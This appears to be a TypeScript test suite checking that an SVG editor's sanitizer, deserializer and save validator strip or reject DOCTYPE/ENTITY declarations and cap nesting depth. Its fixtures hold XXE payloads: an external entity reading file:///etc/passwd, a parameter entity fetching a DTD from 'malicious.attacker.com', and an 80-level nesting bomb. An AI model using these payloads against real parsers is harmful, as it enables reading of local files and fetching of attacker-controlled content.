import { DOMParser } from 'linkedom';
if (typeof (globalThis as any).DOMParser === 'undefined') {
  (globalThis as any).DOMParser = DOMParser;
}

import { SvgSanitizer } from '../src/webview/engine/security/SvgSanitizer.js';
import { SvgDeserializer } from '../src/webview/engine/serialization/SvgDeserializer.js';
import { VectorModel } from '../src/webview/engine/VectorModel.js';
import { HostSaveValidator } from '../src/shared/validation/HostSaveValidator.js';

export function runXmlParserHardeningTests(): boolean {
  console.log('\n======================================================');
  console.log('🧪 Running XML Parser Hardening & Anti-XXE/DoS Suite');
  console.log('======================================================');

  let passedCount = 0;
  let failedCount = 0;

  function assert(condition: boolean, desc: string): void {
    if (condition) {
      console.log(`  ✅ [PASS] ${desc}`);
      passedCount++;
    } else {
      console.error(`  ❌ [FAIL] ${desc}`);
      failedCount++;
    }
  }

  // --- 1. DOCTYPE and Entity Neutralization ---
  const xxeDoctypeSvg = `<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE svg [
    <!ELEMENT svg ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >
    <!ENTITY lol1 "lol">
  ]>
  <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <rect x="0" y="0" width="50" height="50"/>
  </svg>`;

  const stripResult = SvgSanitizer.stripDoctypeAndEntities(xxeDoctypeSvg);
  assert(stripResult.strippedCount >= 1, 'Detected and stripped DOCTYPE / ENTITY declarations');
  assert(!stripResult.sanitizedXml.includes('<!DOCTYPE'), 'Sanitized XML contains zero DOCTYPE directives');
  assert(!stripResult.sanitizedXml.includes('<!ENTITY'), 'Sanitized XML contains zero ENTITY directives');
  assert(stripResult.sanitizedXml.includes('<rect'), 'Sanitized XML preserves legitimate vector elements');

  // --- 2. Ingestion via SvgDeserializer with XXE Payloads ---
  const model = new VectorModel();
  SvgDeserializer.loadSvgString(xxeDoctypeSvg, model);
  assert(model.elements.length === 1, 'Model ingested vector element after stripping DOCTYPE/XXE safely');
  assert(model.elements[0].tagName === 'rect', 'Ingested element is rect');

  // Standalone ENTITY injection
  const standaloneEntitySvg = `
    <!ENTITY % dtd SYSTEM "http://malicious.attacker.com/evil.dtd">
    <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
      <circle cx="10" cy="10" r="5"/>
    </svg>
  `;
  const model2 = new VectorModel();
  SvgDeserializer.loadSvgString(standaloneEntitySvg, model2);
  assert(model2.elements.length === 1, 'Standalone ENTITY neutralized and circle ingested safely');
  assert(model2.elements[0].tagName === 'circle', 'Ingested element is circle');

  // --- 3. Recursion Depth Limiter in SvgSanitizer & SvgDeserializer ---
  // Construct a nested tree with depth 80 (> maxDepth 64)
  let nestedSvg = '<rect id="leaf_rect" x="0" y="0" width="10" height="10"/>';
  for (let i = 0; i < 80; i++) {
    nestedSvg = `<g id="group_level_${i}">${nestedSvg}</g>`;
  }
  nestedSvg = `<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">${nestedSvg}</svg>`;

  const parser = new (globalThis as any).DOMParser();
  const doc = parser.parseFromString(nestedSvg, 'image/svg+xml');
  const sanRes = SvgSanitizer.sanitizeDocument(doc);
  assert(sanRes.removedElementsCount > 0, 'Excessively nested elements beyond depth 64 truncated in SvgSanitizer');

  // Deserializing deeply nested SVG without call-stack crash
  const model3 = new VectorModel();
  let stackCrashed = false;
  try {
    SvgDeserializer.loadSvgString(nestedSvg, model3);
  } catch (e) {
    stackCrashed = true;
    console.error('Stack overflow crash occurred:', e);
  }
  assert(!stackCrashed, 'SvgDeserializer handled 80-level deep SVG without call stack overflow crash');
  assert(model3.elements.length === 1, 'Top group ingested successfully within recursion limit');

  // --- 4. HostSaveValidator Anti-XXE Rejection ---
  const hostValXxe = HostSaveValidator.validateSvgIntegrity(xxeDoctypeSvg);
  assert(!hostValXxe.isValid && hostValXxe.error?.includes('XXE'), 'HostSaveValidator strictly blocks DOCTYPE / SYSTEM entities from writing to disk');

  const hostValPublic = HostSaveValidator.validateSvgIntegrity(`
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="100" height="100"><rect x="0" y="0" width="10" height="10"/></svg>
  `);
  assert(!hostValPublic.isValid && hostValPublic.error?.includes('XXE'), 'HostSaveValidator blocks PUBLIC DTD external entity declarations');

  console.log(`\nResults: ${passedCount} passed, ${failedCount} failed.`);
  return failedCount === 0;
}
